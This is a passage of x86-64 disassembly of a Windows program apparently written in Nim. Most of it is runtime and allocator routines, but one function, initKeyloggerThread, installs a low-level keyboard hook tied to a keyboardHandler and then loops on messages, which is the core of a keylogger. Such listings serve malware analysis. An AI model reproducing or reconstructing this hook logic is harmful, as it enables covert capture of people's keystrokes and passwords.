  40168f:	4a 85 54 c0 10       	test   %rdx,0x10(%rax,%r8,8)
  401694:	0f 95 c2             	setne  %dl
  401697:	89 d0                	mov    %edx,%eax
  401699:	48 83 c4 28          	add    $0x28,%rsp
  40169d:	c3                   	ret

000000000040169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>:
  40169e:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4016a2:	48 8b 00             	mov    (%rax),%rax
  4016a5:	48 83 f8 02          	cmp    $0x2,%rax
  4016a9:	74 23                	je     4016ce <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x30>
  4016ab:	7f 07                	jg     4016b4 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x16>
  4016ad:	48 ff c8             	dec    %rax
  4016b0:	74 12                	je     4016c4 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x26>
  4016b2:	eb 0c                	jmp    4016c0 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x22>
  4016b4:	48 83 f8 04          	cmp    $0x4,%rax
  4016b8:	74 1e                	je     4016d8 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x3a>
  4016ba:	48 83 f8 08          	cmp    $0x8,%rax
  4016be:	74 21                	je     4016e1 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x43>
  4016c0:	31 c0                	xor    %eax,%eax
  4016c2:	eb 25                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016c4:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016c8:	0f b6 04 08          	movzbl (%rax,%rcx,1),%eax
  4016cc:	eb 1b                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016ce:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016d2:	0f b7 04 08          	movzwl (%rax,%rcx,1),%eax
  4016d6:	eb 11                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016d8:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016dc:	8b 04 08             	mov    (%rax,%rcx,1),%eax
  4016df:	eb 08                	jmp    4016e9 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x4b>
  4016e1:	48 8b 42 08          	mov    0x8(%rdx),%rax
  4016e5:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
  4016e9:	48 8b 4a 20          	mov    0x20(%rdx),%rcx
  4016ed:	48 8b 52 28          	mov    0x28(%rdx),%rdx
  4016f1:	48 39 c1             	cmp    %rax,%rcx
  4016f4:	76 09                	jbe    4016ff <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x61>
  4016f6:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
  4016fa:	48 85 c0             	test   %rax,%rax
  4016fd:	75 04                	jne    401703 <selectBranch__2us2RQByTh81i9aW4EEgfmw+0x65>
  4016ff:	48 8b 04 ca          	mov    (%rdx,%rcx,8),%rax
  401703:	c3                   	ret

0000000000401704 <Marker_tyRef__HsJiUUcO9cHBdUCi0HwkSTA>:
  401704:	c3                   	ret

0000000000401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>:
  401705:	48 8b 01             	mov    (%rcx),%rax
  401708:	48 8b 50 08          	mov    0x8(%rax),%rdx
  40170c:	4c 8b 48 20          	mov    0x20(%rax),%r9
  401710:	4c 8b 42 08          	mov    0x8(%rdx),%r8
  401714:	4d 39 48 20          	cmp    %r9,0x20(%r8)
  401718:	75 17                	jne    401731 <split__NJo8pxZdXEAIa7wkHls9cOw_2+0x2c>
  40171a:	48 89 11             	mov    %rdx,(%rcx)
  40171d:	48 8b 12             	mov    (%rdx),%rdx
  401720:	48 89 50 08          	mov    %rdx,0x8(%rax)
  401724:	48 8b 11             	mov    (%rcx),%rdx
  401727:	48 89 02             	mov    %rax,(%rdx)
  40172a:	48 8b 01             	mov    (%rcx),%rax
  40172d:	48 ff 40 20          	incq   0x20(%rax)
  401731:	c3                   	ret

0000000000401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>:
  401732:	48 8b 01             	mov    (%rcx),%rax
  401735:	48 8b 10             	mov    (%rax),%rdx
  401738:	4c 8b 40 20          	mov    0x20(%rax),%r8
  40173c:	4c 39 42 20          	cmp    %r8,0x20(%rdx)
  401740:	75 11                	jne    401753 <skew__NJo8pxZdXEAIa7wkHls9cOw+0x21>
  401742:	48 89 11             	mov    %rdx,(%rcx)
  401745:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401749:	48 89 10             	mov    %rdx,(%rax)
  40174c:	48 8b 11             	mov    (%rcx),%rdx
  40174f:	48 89 42 08          	mov    %rax,0x8(%rdx)
  401753:	c3                   	ret

0000000000401754 <del__Io5JDKCS5u26IEWw0J53hQ>:
  401754:	57                   	push   %rdi
  401755:	56                   	push   %rsi
  401756:	53                   	push   %rbx
  401757:	48 83 ec 20          	sub    $0x20,%rsp
  40175b:	48 89 d6             	mov    %rdx,%rsi
  40175e:	48 8b 12             	mov    (%rdx),%rdx
  401761:	48 89 cb             	mov    %rcx,%rbx
  401764:	4c 89 c7             	mov    %r8,%rdi
  401767:	48 3b 12             	cmp    (%rdx),%rdx
  40176a:	0f 84 07 01 00 00    	je     401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  401770:	4c 3b 42 10          	cmp    0x10(%rdx),%r8
  401774:	48 89 91 b8 30 00 00 	mov    %rdx,0x30b8(%rcx)
  40177b:	72 0e                	jb     40178b <del__Io5JDKCS5u26IEWw0J53hQ+0x37>
  40177d:	48 89 91 b0 30 00 00 	mov    %rdx,0x30b0(%rcx)
  401784:	48 8b 06             	mov    (%rsi),%rax
  401787:	48 8d 50 08          	lea    0x8(%rax),%rdx
  40178b:	49 89 f8             	mov    %rdi,%r8
  40178e:	48 89 d9             	mov    %rbx,%rcx
  401791:	e8 be ff ff ff       	call   401754 <del__Io5JDKCS5u26IEWw0J53hQ>
  401796:	48 8b 16             	mov    (%rsi),%rdx
  401799:	48 3b 93 b8 30 00 00 	cmp    0x30b8(%rbx),%rdx
  4017a0:	75 12                	jne    4017b4 <del__Io5JDKCS5u26IEWw0J53hQ+0x60>
  4017a2:	48 8b 83 b0 30 00 00 	mov    0x30b0(%rbx),%rax
  4017a9:	48 3b 00             	cmp    (%rax),%rax
  4017ac:	74 06                	je     4017b4 <del__Io5JDKCS5u26IEWw0J53hQ+0x60>
  4017ae:	48 3b 78 10          	cmp    0x10(%rax),%rdi
  4017b2:	74 16                	je     4017ca <del__Io5JDKCS5u26IEWw0J53hQ+0x76>
  4017b4:	48 8b 0a             	mov    (%rdx),%rcx
  4017b7:	48 8b 42 20          	mov    0x20(%rdx),%rax
  4017bb:	48 ff c8             	dec    %rax
  4017be:	48 39 41 20          	cmp    %rax,0x20(%rcx)
  4017c2:	48 8b 4a 08          	mov    0x8(%rdx),%rcx
  4017c6:	7d 5c                	jge    401824 <del__Io5JDKCS5u26IEWw0J53hQ+0xd0>
  4017c8:	eb 60                	jmp    40182a <del__Io5JDKCS5u26IEWw0J53hQ+0xd6>
  4017ca:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
  4017ce:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  4017d5:	00 
  4017d6:	48 8b 52 18          	mov    0x18(%rdx),%rdx
  4017da:	48 89 48 10          	mov    %rcx,0x10(%rax)
  4017de:	48 89 50 18          	mov    %rdx,0x18(%rax)
  4017e2:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  4017e9:	75 0e                	jne    4017f9 <del__Io5JDKCS5u26IEWw0J53hQ+0xa5>
  4017eb:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  4017f2:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  4017f9:	48 89 83 b0 30 00 00 	mov    %rax,0x30b0(%rbx)
  401800:	48 8b 06             	mov    (%rsi),%rax
  401803:	48 8b 40 08          	mov    0x8(%rax),%rax
  401807:	48 89 06             	mov    %rax,(%rsi)
  40180a:	48 8b 83 b8 30 00 00 	mov    0x30b8(%rbx),%rax
  401811:	48 8b 93 c0 30 00 00 	mov    0x30c0(%rbx),%rdx
  401818:	48 89 10             	mov    %rdx,(%rax)
  40181b:	48 89 83 c0 30 00 00 	mov    %rax,0x30c0(%rbx)
  401822:	eb 53                	jmp    401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  401824:	48 3b 41 20          	cmp    0x20(%rcx),%rax
  401828:	7e 4d                	jle    401877 <del__Io5JDKCS5u26IEWw0J53hQ+0x123>
  40182a:	48 89 42 20          	mov    %rax,0x20(%rdx)
  40182e:	48 3b 41 20          	cmp    0x20(%rcx),%rax
  401832:	7d 04                	jge    401838 <del__Io5JDKCS5u26IEWw0J53hQ+0xe4>
  401834:	48 89 41 20          	mov    %rax,0x20(%rcx)
  401838:	48 89 f1             	mov    %rsi,%rcx
  40183b:	e8 f2 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  401840:	48 8b 06             	mov    (%rsi),%rax
  401843:	48 8d 48 08          	lea    0x8(%rax),%rcx
  401847:	e8 e6 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  40184c:	48 8b 06             	mov    (%rsi),%rax
  40184f:	48 8b 48 08          	mov    0x8(%rax),%rcx
  401853:	48 83 c1 08          	add    $0x8,%rcx
  401857:	e8 d6 fe ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  40185c:	48 89 f1             	mov    %rsi,%rcx
  40185f:	e8 a1 fe ff ff       	call   401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>
  401864:	48 8b 0e             	mov    (%rsi),%rcx
  401867:	48 83 c1 08          	add    $0x8,%rcx
  40186b:	48 83 c4 20          	add    $0x20,%rsp
  40186f:	5b                   	pop    %rbx
  401870:	5e                   	pop    %rsi
  401871:	5f                   	pop    %rdi
  401872:	e9 8e fe ff ff       	jmp    401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>
  401877:	48 83 c4 20          	add    $0x20,%rsp
  40187b:	5b                   	pop    %rbx
  40187c:	5e                   	pop    %rsi
  40187d:	5f                   	pop    %rdi
  40187e:	c3                   	ret

000000000040187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>:
  40187f:	0f b6 c2             	movzbl %dl,%eax
  401882:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
  401886:	48 85 c0             	test   %rax,%rax
  401889:	74 0b                	je     401896 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x17>
  40188b:	48 39 50 08          	cmp    %rdx,0x8(%rax)
  40188f:	74 05                	je     401896 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x17>
  401891:	48 8b 00             	mov    (%rax),%rax
  401894:	eb f0                	jmp    401886 <intSetGet__O3FRrWKKUdi8uRTGxiPdIg+0x7>
  401896:	c3                   	ret

0000000000401897 <excl__9cAWqpgI1NbhhZ3cVPHhI5A>:
  401897:	48 83 ec 28          	sub    $0x28,%rsp
  40189b:	49 89 d0             	mov    %rdx,%r8
  40189e:	48 c1 fa 09          	sar    $0x9,%rdx
  4018a2:	e8 d8 ff ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  4018a7:	48 85 c0             	test   %rax,%rax
  4018aa:	74 21                	je     4018cd <excl__9cAWqpgI1NbhhZ3cVPHhI5A+0x36>
  4018ac:	4c 89 c1             	mov    %r8,%rcx
  4018af:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4018b5:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4018bb:	48 89 ca             	mov    %rcx,%rdx
  4018be:	49 d3 e0             	shl    %cl,%r8
  4018c1:	48 c1 fa 06          	sar    $0x6,%rdx
  4018c5:	49 f7 d0             	not    %r8
  4018c8:	4c 21 44 d0 10       	and    %r8,0x10(%rax,%rdx,8)
  4018cd:	48 83 c4 28          	add    $0x28,%rsp
  4018d1:	c3                   	ret

00000000004018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>:
  4018d2:	48 83 ec 28          	sub    $0x28,%rsp
  4018d6:	49 89 d0             	mov    %rdx,%r8
  4018d9:	48 c1 fa 09          	sar    $0x9,%rdx
  4018dd:	e8 9d ff ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  4018e2:	31 d2                	xor    %edx,%edx
  4018e4:	48 85 c0             	test   %rax,%rax
  4018e7:	74 1b                	je     401904 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ+0x32>
  4018e9:	4c 89 c1             	mov    %r8,%rcx
  4018ec:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4018f2:	48 89 ca             	mov    %rcx,%rdx
  4018f5:	48 c1 fa 06          	sar    $0x6,%rdx
  4018f9:	48 8b 54 d0 10       	mov    0x10(%rax,%rdx,8),%rdx
  4018fe:	48 d3 ea             	shr    %cl,%rdx
  401901:	83 e2 01             	and    $0x1,%edx
  401904:	89 d0                	mov    %edx,%eax
  401906:	48 83 c4 28          	add    $0x28,%rsp
  40190a:	c3                   	ret

000000000040190b <msbit__NR8XkKls428clCUr82szCgsystem>:
  40190b:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  401911:	89 c8                	mov    %ecx,%eax
  401913:	76 13                	jbe    401928 <msbit__NR8XkKls428clCUr82szCgsystem+0x1d>
  401915:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  40191b:	48 19 c9             	sbb    %rcx,%rcx
  40191e:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
  401922:	48 83 c1 18          	add    $0x18,%rcx
  401926:	eb 0f                	jmp    401937 <msbit__NR8XkKls428clCUr82szCgsystem+0x2c>
  401928:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40192e:	48 19 c9             	sbb    %rcx,%rcx
  401931:	48 f7 d1             	not    %rcx
  401934:	83 e1 08             	and    $0x8,%ecx
  401937:	48 8d 15 e2 f5 00 00 	lea    0xf5e2(%rip),%rdx        # 410f20 <fsLookupTable__Gn52IZvqY4slyBTOYwGNRQ>
  40193e:	d3 e8                	shr    %cl,%eax
  401940:	48 0f be 04 02       	movsbq (%rdx,%rax,1),%rax
  401945:	48 01 c8             	add    %rcx,%rax
  401948:	c3                   	ret

0000000000401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.25>:
  401949:	53                   	push   %rbx
  40194a:	48 83 ec 20          	sub    $0x20,%rsp
  40194e:	48 89 cb             	mov    %rcx,%rbx
  401951:	48 8d 0d 18 95 02 00 	lea    0x29518(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  401958:	ff 15 5e 69 04 00    	call   *0x4695e(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  40195e:	48 8b 0b             	mov    (%rbx),%rcx
  401961:	83 ca ff             	or     $0xffffffff,%edx
  401964:	ff 15 36 c8 02 00    	call   *0x2c836(%rip)        # 42e1a0 <Dl_1285035_>
  40196a:	48 8d 0d ff 94 02 00 	lea    0x294ff(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  401971:	48 83 c4 20          	add    $0x20,%rsp
  401975:	5b                   	pop    %rbx
  401976:	48 ff 25 ef 68 04 00 	rex.W jmp *0x468ef(%rip)        # 44826c <__imp_EnterCriticalSection>

000000000040197d <appendString.part.0>:
  40197d:	57                   	push   %rdi
  40197e:	56                   	push   %rsi
  40197f:	48 8b 3a             	mov    (%rdx),%rdi
  401982:	48 8d 72 10          	lea    0x10(%rdx),%rsi
  401986:	48 89 c8             	mov    %rcx,%rax
  401989:	48 8b 09             	mov    (%rcx),%rcx
  40198c:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
  401991:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  401995:	4c 89 c7             	mov    %r8,%rdi
  401998:	f3 a4                	rep movsb (%rsi),(%rdi)
  40199a:	48 8b 12             	mov    (%rdx),%rdx
  40199d:	48 01 10             	add    %rdx,(%rax)
  4019a0:	5e                   	pop    %rsi
  4019a1:	5f                   	pop    %rdi
  4019a2:	c3                   	ret

00000000004019a3 <appendString.lto_priv.49>:
  4019a3:	48 85 d2             	test   %rdx,%rdx
  4019a6:	74 02                	je     4019aa <appendString.lto_priv.49+0x7>
  4019a8:	eb d3                	jmp    40197d <appendString.part.0>
  4019aa:	c3                   	ret

00000000004019ab <nimLoadLibrary>:
  4019ab:	48 83 ec 28          	sub    $0x28,%rsp
  4019af:	e8 9d fb ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  4019b4:	48 89 c1             	mov    %rax,%rcx
  4019b7:	48 83 c4 28          	add    $0x28,%rsp
  4019bb:	48 ff 25 02 69 04 00 	rex.W jmp *0x46902(%rip)        # 4482c4 <__imp_LoadLibraryA>

00000000004019c2 <nimZeroMem.lto_priv.59>:
  4019c2:	57                   	push   %rdi
  4019c3:	31 c0                	xor    %eax,%eax
  4019c5:	49 89 c8             	mov    %rcx,%r8
  4019c8:	48 89 d1             	mov    %rdx,%rcx
  4019cb:	4c 89 c7             	mov    %r8,%rdi
  4019ce:	f3 aa                	rep stos %al,(%rdi)
  4019d0:	5f                   	pop    %rdi
  4019d1:	c3                   	ret

00000000004019d2 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw>:
  4019d2:	53                   	push   %rbx
  4019d3:	48 83 ec 50          	sub    $0x50,%rsp
  4019d7:	48 8d 15 d8 42 00 00 	lea    0x42d8(%rip),%rdx        # 405cb6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw>
  4019de:	b9 0d 00 00 00       	mov    $0xd,%ecx
  4019e3:	45 31 c9             	xor    %r9d,%r9d
  4019e6:	45 31 c0             	xor    %r8d,%r8d
  4019e9:	ff 15 01 93 02 00    	call   *0x29301(%rip)        # 42acf0 <Dl_32210001_>
  4019ef:	ba 30 00 00 00       	mov    $0x30,%edx
  4019f4:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  4019f9:	48 89 d9             	mov    %rbx,%rcx
  4019fc:	e8 c1 ff ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  401a01:	45 31 c9             	xor    %r9d,%r9d
  401a04:	45 31 c0             	xor    %r8d,%r8d
  401a07:	31 d2                	xor    %edx,%edx
  401a09:	48 89 d9             	mov    %rbx,%rcx
  401a0c:	ff 15 ce 92 02 00    	call   *0x292ce(%rip)        # 42ace0 <Dl_31790001_>
  401a12:	85 c0                	test   %eax,%eax
  401a14:	75 eb                	jne    401a01 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw+0x2f>
  401a16:	48 83 c4 50          	add    $0x50,%rsp
  401a1a:	5b                   	pop    %rbx
  401a1b:	c3                   	ret

0000000000401a1c <next__am1q4dBd9cls9au5CcmkX5oA>:
  401a1c:	57                   	push   %rdi
  401a1d:	56                   	push   %rsi
  401a1e:	53                   	push   %rbx
  401a1f:	48 83 ec 40          	sub    $0x40,%rsp
  401a23:	48 89 d6             	mov    %rdx,%rsi
  401a26:	48 89 cf             	mov    %rcx,%rdi
  401a29:	ba 10 00 00 00       	mov    $0x10,%edx
  401a2e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  401a33:	4c 89 c3             	mov    %r8,%rbx
  401a36:	e8 87 ff ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  401a3b:	48 8b 16             	mov    (%rsi),%rdx
  401a3e:	80 7e 10 00          	cmpb   $0x0,0x10(%rsi)
  401a42:	48 89 56 08          	mov    %rdx,0x8(%rsi)
  401a46:	75 4e                	jne    401a96 <next__am1q4dBd9cls9au5CcmkX5oA+0x7a>
  401a48:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  401a4c:	3c 5c                	cmp    $0x5c,%al
  401a4e:	74 04                	je     401a54 <next__am1q4dBd9cls9au5CcmkX5oA+0x38>
  401a50:	3c 2f                	cmp    $0x2f,%al
  401a52:	75 42                	jne    401a96 <next__am1q4dBd9cls9au5CcmkX5oA+0x7a>
  401a54:	48 8b 0b             	mov    (%rbx),%rcx
  401a57:	48 8d 42 01          	lea    0x1(%rdx),%rax
  401a5b:	48 89 06             	mov    %rax,(%rsi)
  401a5e:	48 39 c8             	cmp    %rcx,%rax
  401a61:	7d 42                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a63:	80 7c 13 11 5c       	cmpb   $0x5c,0x11(%rbx,%rdx,1)
  401a68:	75 3b                	jne    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a6a:	48 8d 42 02          	lea    0x2(%rdx),%rax
  401a6e:	48 39 c8             	cmp    %rcx,%rax
  401a71:	7d 32                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a73:	80 7c 13 12 5c       	cmpb   $0x5c,0x12(%rbx,%rdx,1)
  401a78:	74 2b                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a7a:	48 89 06             	mov    %rax,(%rsi)
  401a7d:	eb 26                	jmp    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a7f:	48 39 c1             	cmp    %rax,%rcx
  401a82:	7d 21                	jge    401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a84:	8a 44 0b 10          	mov    0x10(%rbx,%rcx,1),%al
  401a88:	3c 5c                	cmp    $0x5c,%al
  401a8a:	74 19                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a8c:	3c 2f                	cmp    $0x2f,%al
  401a8e:	74 15                	je     401aa5 <next__am1q4dBd9cls9au5CcmkX5oA+0x89>
  401a90:	48 ff c1             	inc    %rcx
  401a93:	48 89 0e             	mov    %rcx,(%rsi)
  401a96:	31 c0                	xor    %eax,%eax
  401a98:	48 85 db             	test   %rbx,%rbx
  401a9b:	48 8b 0e             	mov    (%rsi),%rcx
  401a9e:	74 df                	je     401a7f <next__am1q4dBd9cls9au5CcmkX5oA+0x63>
  401aa0:	48 8b 03             	mov    (%rbx),%rax
  401aa3:	eb da                	jmp    401a7f <next__am1q4dBd9cls9au5CcmkX5oA+0x63>
  401aa5:	48 8b 0e             	mov    (%rsi),%rcx
  401aa8:	48 39 ca             	cmp    %rcx,%rdx
  401aab:	7c 2b                	jl     401ad8 <next__am1q4dBd9cls9au5CcmkX5oA+0xbc>
  401aad:	31 c0                	xor    %eax,%eax
  401aaf:	48 85 db             	test   %rbx,%rbx
  401ab2:	74 03                	je     401ab7 <next__am1q4dBd9cls9au5CcmkX5oA+0x9b>
  401ab4:	48 8b 03             	mov    (%rbx),%rax
  401ab7:	48 39 c1             	cmp    %rax,%rcx
  401aba:	7d 3e                	jge    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401abc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401ac1:	49 89 d8             	mov    %rbx,%r8
  401ac4:	48 89 f2             	mov    %rsi,%rdx
  401ac7:	e8 50 ff ff ff       	call   401a1c <next__am1q4dBd9cls9au5CcmkX5oA>
  401acc:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
  401ad1:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
  401ad6:	eb 22                	jmp    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401ad8:	48 ff c9             	dec    %rcx
  401adb:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
  401ae0:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
  401ae5:	eb 13                	jmp    401afa <next__am1q4dBd9cls9au5CcmkX5oA+0xde>
  401ae7:	48 39 c2             	cmp    %rax,%rdx
  401aea:	7d 21                	jge    401b0d <next__am1q4dBd9cls9au5CcmkX5oA+0xf1>
  401aec:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
  401af0:	3c 5c                	cmp    $0x5c,%al
  401af2:	75 15                	jne    401b09 <next__am1q4dBd9cls9au5CcmkX5oA+0xed>
  401af4:	48 ff c2             	inc    %rdx
  401af7:	48 89 16             	mov    %rdx,(%rsi)
  401afa:	31 c0                	xor    %eax,%eax
  401afc:	48 85 db             	test   %rbx,%rbx
  401aff:	48 8b 16             	mov    (%rsi),%rdx
  401b02:	74 e3                	je     401ae7 <next__am1q4dBd9cls9au5CcmkX5oA+0xcb>
  401b04:	48 8b 03             	mov    (%rbx),%rax
  401b07:	eb de                	jmp    401ae7 <next__am1q4dBd9cls9au5CcmkX5oA+0xcb>
  401b09:	3c 2f                	cmp    $0x2f,%al
  401b0b:	74 e7                	je     401af4 <next__am1q4dBd9cls9au5CcmkX5oA+0xd8>
  401b0d:	0f 28 4c 24 30       	movaps 0x30(%rsp),%xmm1
  401b12:	48 89 f8             	mov    %rdi,%rax
  401b15:	c6 46 10 01          	movb   $0x1,0x10(%rsi)
  401b19:	0f 11 0f             	movups %xmm1,(%rdi)
  401b1c:	48 83 c4 40          	add    $0x40,%rsp
  401b20:	5b                   	pop    %rbx
  401b21:	5e                   	pop    %rsi
  401b22:	5f                   	pop    %rdi
  401b23:	c3                   	ret

0000000000401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>:
  401b24:	48 83 ec 38          	sub    $0x38,%rsp
  401b28:	49 89 ca             	mov    %rcx,%r10
  401b2b:	49 89 d1             	mov    %rdx,%r9
  401b2e:	ba 10 00 00 00       	mov    $0x10,%edx
  401b33:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401b38:	e8 85 fe ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  401b3d:	44 89 c9             	mov    %r9d,%ecx
  401b40:	e8 c6 fd ff ff       	call   40190b <msbit__NR8XkKls428clCUr82szCgsystem>
  401b45:	8d 48 fb             	lea    -0x5(%rax),%ecx
  401b48:	48 83 e8 06          	sub    $0x6,%rax
  401b4c:	49 d3 f9             	sar    %cl,%r9
  401b4f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401b54:	4c 89 d0             	mov    %r10,%rax
  401b57:	49 83 e9 20          	sub    $0x20,%r9
  401b5b:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  401b60:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
  401b65:	41 0f 11 02          	movups %xmm0,(%r10)
  401b69:	48 83 c4 38          	add    $0x38,%rsp
  401b6d:	c3                   	ret

0000000000401b6e <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2>:
  401b6e:	53                   	push   %rbx
  401b6f:	48 83 ec 30          	sub    $0x30,%rsp
  401b73:	49 89 d3             	mov    %rdx,%r11
  401b76:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401b7a:	48 89 cb             	mov    %rcx,%rbx
  401b7d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401b82:	e8 9d ff ff ff       	call   401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>
  401b87:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  401b8c:	49 8b 43 10          	mov    0x10(%r11),%rax
  401b90:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401b95:	48 85 c0             	test   %rax,%rax
  401b98:	74 08                	je     401ba2 <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x34>
  401b9a:	49 8b 53 18          	mov    0x18(%r11),%rdx
  401b9e:	48 89 50 18          	mov    %rdx,0x18(%rax)
  401ba2:	49 8b 53 18          	mov    0x18(%r11),%rdx
  401ba6:	48 85 d2             	test   %rdx,%rdx
  401ba9:	74 04                	je     401baf <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x41>
  401bab:	48 89 42 10          	mov    %rax,0x10(%rdx)
  401baf:	4c 89 c0             	mov    %r8,%rax
  401bb2:	48 c1 e0 05          	shl    $0x5,%rax
  401bb6:	48 01 c8             	add    %rcx,%rax
  401bb9:	48 8d 14 c3          	lea    (%rbx,%rax,8),%rdx
  401bbd:	4c 39 9a 78 10 00 00 	cmp    %r11,0x1078(%rdx)
  401bc4:	75 45                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bc6:	49 8b 43 10          	mov    0x10(%r11),%rax
  401bca:	48 85 c0             	test   %rax,%rax
  401bcd:	48 89 82 78 10 00 00 	mov    %rax,0x1078(%rdx)
  401bd4:	75 35                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bd6:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
  401bda:	b8 01 00 00 00       	mov    $0x1,%eax
  401bdf:	83 e1 1f             	and    $0x1f,%ecx
  401be2:	48 89 c2             	mov    %rax,%rdx
  401be5:	48 d3 e2             	shl    %cl,%rdx
  401be8:	f7 d2                	not    %edx
  401bea:	41 23 91 14 10 00 00 	and    0x1014(%r9),%edx
  401bf1:	41 89 91 14 10 00 00 	mov    %edx,0x1014(%r9)
  401bf8:	75 11                	jne    401c0b <removeChunkFromMatrix__YSJZJgeU5UU2aa8GNvs3WA_2+0x9d>
  401bfa:	44 89 c1             	mov    %r8d,%ecx
  401bfd:	83 e1 1f             	and    $0x1f,%ecx
  401c00:	48 d3 e0             	shl    %cl,%rax
  401c03:	f7 d0                	not    %eax
  401c05:	21 83 10 10 00 00    	and    %eax,0x1010(%rbx)
  401c0b:	49 c7 43 18 00 00 00 	movq   $0x0,0x18(%r11)
  401c12:	00 
  401c13:	49 c7 43 10 00 00 00 	movq   $0x0,0x10(%r11)
  401c1a:	00 
  401c1b:	48 83 c4 30          	add    $0x30,%rsp
  401c1f:	5b                   	pop    %rbx
